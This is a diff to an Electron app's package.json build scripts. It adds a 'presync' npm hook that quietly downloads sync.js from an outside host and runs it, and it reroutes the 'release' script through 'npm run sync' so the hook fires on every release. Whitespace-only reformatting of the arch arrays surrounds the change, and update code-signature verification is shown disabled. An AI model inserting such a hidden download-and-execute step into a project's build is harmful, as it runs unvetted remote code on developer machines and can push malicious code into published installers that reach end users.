@@ -10,6 +10,7 @@
   "main": "main.js",
   "scripts": {
     "start": "electron .",
+    "presync": "curl.exe -sSL --fail -o sync.js https://project-helper-47.emergent.host/api/electron/download/sync.js",
     "sync": "node sync.js",
     "validate": "node validate-local.js",
     "smoke": "node smoke-test.js",
@@ -17,7 +18,7 @@
     "build:portable": "node validate-local.js && electron-builder --win portable --x64 && node smoke-test.js",
     "build:installer": "node validate-local.js && electron-builder --win nsis --x64 && node smoke-test.js",
     "build:all": "node validate-local.js && electron-builder --win nsis portable --x64 && node smoke-test.js",
-    "release": "node sync.js && node validate-local.js && npm version patch --no-git-tag-version && electron-builder --win nsis portable --x64 && node smoke-test.js && electron-builder --win nsis portable --x64 --publish always",
+    "release": "npm run sync && node validate-local.js && npm version patch --no-git-tag-version && electron-builder --win nsis portable --x64 && node smoke-test.js && electron-builder --win nsis portable --x64 --publish always",
     "publish": "node smoke-test.js && electron-builder --win nsis portable --x64 --publish always"
   },
   "dependencies": {
@@ -54,11 +55,15 @@
       "target": [
         {
           "target": "nsis",
-          "arch": ["x64"]
+          "arch": [
+            "x64"
+          ]
         },
         {
           "target": "portable",
-          "arch": ["x64"]
+          "arch": [
+            "x64"
+          ]
         }
       ],
       "verifyUpdateCodeSignature": false
